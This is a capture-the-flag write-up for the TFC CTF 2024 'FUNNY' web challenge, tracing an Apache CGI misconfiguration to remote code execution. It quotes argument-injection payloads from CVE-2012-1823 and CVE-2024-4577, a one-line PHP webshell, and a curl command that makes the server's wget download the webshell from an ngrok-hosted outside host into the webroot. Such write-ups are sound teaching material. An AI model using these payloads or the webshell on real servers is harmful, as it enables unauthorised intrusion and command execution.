# FUNNY

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 34 solves / 394 points
- Author: @hofill
- Difficulty: Medium
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

This challenge is HILARIOUS!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805160704.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805160809.png)

In here, there's a button that says "Generate Joke". Let's click on it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/images/Pasted%20image%2020240805160841.png)

When we clicked the "Generate Joke" button, it'll send a GET request to `/` with GET parameter `new_joke`.

Hmm... Not much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/TFC-CTF-2024/Web/FUNNY/funny.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|16:09:44(HKT)]
└> file funny.zip 
funny.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|16:09:46(HKT)]
└> unzip funny.zip          
Archive:  funny.zip
   creating: funny/
   creating: funny/config/
  inflating: funny/config/httpd.conf  
   creating: funny/public-html/
  inflating: funny/public-html/index.php  
  inflating: funny/public-html/hacker.png  
  inflating: funny/Dockerfile        
```

After reading it a little bit, we quickly found that `funny/public-html/index.php` is useless for us. Basically it picks a random item in an array and outputs it:

```php
<?php 
  $jokes = ["Why did the hacker go broke? He used up all his cache.", "Why was the JavaScript reality show cancelled after one episode? People thought it was too scripted.", "Why do programmers prefer dark mode? Light attracts bugs."];

  if (isset($_GET['new_joke'])) {
    echo $jokes[array_rand($jokes)];
  }
?>
```

What most interesting for us, is the **Apache configuration file, `funny/config/httpd.conf`**.

If we take a look at the config file, we should see the following config:

```
LoadModule cgi_module modules/mod_cgi.so
[...]
ScriptAlias /cgi-bin /usr/bin
Action php-script /cgi-bin/php-cgi
AddHandler php-script .php

<Directory /usr/bin>
    Order allow,deny
    Allow from all
</Directory>
```

First, it loads the [`cgi_module` Apache module](https://httpd.apache.org/docs/current/mod/mod_cgi.html).

> The CGI (Common Gateway Interface) defines a way for a web server to interact with external content-generating programs, which are often referred to as CGI programs or CGI scripts. It is a simple way to put dynamic content on your web site, using whatever programming language you're most familiar with. This document will be an introduction to setting up CGI on your Apache web server, and getting started writing CGI programs. - [https://httpd.apache.org/docs/current/howto/cgi.html](https://httpd.apache.org/docs/current/howto/cgi.html)

Basically when a user sends a request to a path that binds to a CGI script, the web server runs the CGI script and return the result back to the user.

In our case, request path `/cgi-bin` is bind to OS path `/usr/bin`. So, whenever a user visit request path `/cgi-bin`, the web server will go to OS path `/usr/bin`:

```
ScriptAlias /cgi-bin /usr/bin
```

Then, if the user requested a path that ends with extension `.php`, the web server parses the PHP script to [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php). Effectively executing PHP scripts with PHP CGI instead of the PHP interpreter:

```
Action php-script /cgi-bin/php-cgi
AddHandler php-script .php
```

Finally, the OS directory `/usr/bin` is allowed to anyone from accessing it:

```
<Directory /usr/bin>
    Order allow,deny
    Allow from all
</Directory>
```

Hmm... So this **Apache config allows us to visit anything in `/usr/bin` via request path `/cgi-bin`**??

Since OS directory `/usr/bin` is a place to store different binaries, **what happens if we send a request to `/cgi-bin/<whatever_binary>`? Will it execute the binary?**

To test it, we can build a **local testing environment** via Docker.

- Build the Docker image

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY/funny)-[2024.08.05|16:34:10(HKT)]
└> docker build --tag funny:latest .
[...]
```

- Run the Docker container with the built image

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY/funny)-[2024.08.05|16:34:33(HKT)]
└> docker run -p 80:1337 funny:latest
[...]
```

Now we should be able to test it in our `localhost`.

Let's try executing binary `whoami`:

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|16:37:11(HKT)]
└> curl http://localhost/cgi-bin/whoami
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
[...]
```

Hmm... It respond us with HTTP status code "500 Internal Server Error".

What's the Docker container's log message?

```shell
[Mon Aug 05 08:37:31.906129 2024] [cgi:error] [pid 9:tid 31] [client 172.17.0.1:56694] malformed header from script 'whoami': Bad header: www
172.17.0.1 - - [05/Aug/2024:08:37:31 +0000] "GET /cgi-bin/whoami HTTP/1.1" 500 600 "-" "curl/8.8.0"
```

Huh? "`malformed header from script 'whoami': Bad header: www`". As you can see, **it returned `Bad header: www`, so it must be executed**. However, due to the **malformed HTTP response**, Apache returned HTTP status code "500 Internal Server Error".

Hmm... I wonder if we can **inject arbitrary arguments**. If we can, it opens a lot of options to possibly exfiltrate the flag.

After researching about "PHP CGI argument injection", we can see CVE-2024-4577 found by researcher Orange Tsai, as well as CVE-2012-1823.

In CVE-2024-4577, it only affects Windows machine with PHP CGI, default XAMPP config, and a very specific system locale, which is completely useless in our case.

In CVE-2012-1823, it only affects PHP version before 5.3.12 or before 5.4.2. In our case, the PHP version is 8.3.10, which is not affected:

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|16:40:44(HKT)]
└> curl -v http://localhost/                
[...]
< HTTP/1.1 200 OK
< Date: Mon, 05 Aug 2024 08:47:59 GMT
< Server: Apache/2.4.62 (Unix)
< X-Powered-By: PHP/8.3.10
[...]
```

However, both of them have a very similar payload:

```
CVE-2012-1823:
/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a//input

CVE-2024-4577:
/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input=null
```

As you can see, **we can inject arbitrary arguments via the query delimiter (`?`)**!

Let's try it!

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|16:58:15(HKT)]
└> curl http://localhost/cgi-bin/id
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
[...]
```

```shell
[Mon Aug 05 08:58:19.964017 2024] [cgi:error] [pid 101:tid 105] [client 172.17.0.1:55986] malformed header from script 'id': Bad header: uid=1000(www) gid=1000(www) gr
172.17.0.1 - - [05/Aug/2024:08:58:19 +0000] "GET /cgi-bin/id HTTP/1.1" 500 600 "-" "curl/8.8.0"
```

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|16:58:19(HKT)]
└> curl http://localhost/cgi-bin/id?-u
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
[...]
```

```shell
[Mon Aug 05 08:58:22.251355 2024] [cgi:error] [pid 9:tid 83] [client 172.17.0.1:55990] malformed header from script 'id': Bad header: 1000
172.17.0.1 - - [05/Aug/2024:08:58:22 +0000] "GET /cgi-bin/id?-u HTTP/1.1" 500 600 "-" "curl/8.8.0"
```

It worked! The normal `id` command returned `uid=1000(www) gid=1000(www) gr`, while with argument `-u` returned `1000`!

Hmm... Now I wonder which binary we can leverage to exfiltrate the flag.

To see all the binaries in `/usr/bin/`, we can spawn a remote shell inside the Docker container:

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:01:41(HKT)]
└> docker container list
CONTAINER ID   IMAGE          COMMAND                 CREATED          STATUS          PORTS                                   NAMES
5687676ad31e   funny:latest   "httpd -D FOREGROUND"   25 minutes ago   Up 25 minutes   0.0.0.0:80->1337/tcp, :::80->1337/tcp   amazing_mclaren 
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:01:56(HKT)]
└> docker exec -it 5687676ad31e /bin/sh  
/ # cd /usr/bin/
/usr/bin/ # ls -lah
total 11M
drwxr-xr-x 1 root root  12K Aug  3 11:10  .
drwxr-xr-x 1 root root 4.0K Aug  3 11:10  ..
lrwxrwxrwx 1 root root    9 Aug  3 11:10 '[' -> coreutils
lrwxrwxrwx 1 root root   12 Jul 22 14:34 '[[' -> /bin/busybox
-rwxr-xr-x 1 root root  27K Mar 27 17:11  autopoint
lrwxrwxrwx 1 root root   12 Jul 22 14:34  awk -> /bin/busybox
lrwxrwxrwx 1 root root    9 Aug  3 11:10  b2sum -> coreutils
[...]
```

After finding which binary we can take advantage of, I found the `wget` binary:

```shell
/usr/bin # ls -lah wget
lrwxrwxrwx 1 root root 12 Jul 22 14:34 wget -> /bin/busybox
```

Ah ha! We can **use `wget` to write a PHP webshell into a publicly accessible path**!

> Note: There're many more different ways to achieve the same goal.

But wait, where's the publicly accessible path, the webroot of this web application?

In the Apache config file, we can see this:

```
# DocumentRoot: The directory out of which you will serve your
# documents. By default, all requests are taken from this directory, but
# symbolic links and aliases may be used to point to other locations.
#
DocumentRoot /var/www/public
```

So, the webroot of this web application is `/var/www/public`, which means we can write our PHP webshell file into that directory!

## Exploitation

Armed with above information, to exploit this, we can:

- Create a PHP webshell file

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:05:46(HKT)]
└> echo -n '<?php system($_GET["cmd"]);?>' > webshell.php
```

- Host the webshell file

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:06:01(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Port forwarding via `ngrok`

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:05:42(HKT)]
└> ngrok http 8000
[...]
Forwarding                    https://9085-{REDACTED}.ngrok-free.app -> http://localhost:8000
[...]
```

- Send the following payload

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:09:02(HKT)]
└> curl http://challs.tfcctf.com:30472/cgi-bin/wget?https://9085-{REDACTED}.ngrok-free.app/webshell.php+-O+/var/www/public/webshell.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
[...]
```

Which should receive this log message:

```shell
127.0.0.1 - - [05/Aug/2024 17:09:48] "GET /webshell.php HTTP/1.1" 200 -
```

- Execute any OS command in `/webshell.php` via GET parameter `cmd`

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:09:48(HKT)]
└> curl http://challs.tfcctf.com:30472/webshell.php?cmd=id
uid=1000(www) gid=1000(www) groups=1000(www)
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:11:36(HKT)]
└> curl http://challs.tfcctf.com:30472/webshell.php?cmd=ls+-lah+/
[...]
-rw-r--r--   1 root root   59 Aug  3 09:59 flag.txt
[...]
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/FUNNY)-[2024.08.05|17:11:39(HKT)]
└> curl http://challs.tfcctf.com:30472/webshell.php?cmd=cat+/flag.txt
TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}
```

- **Flag: `TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}`**

## Conclusion

What we've learned:

1. Apache CGI misconfiguration to Remote Code Execution (RCE)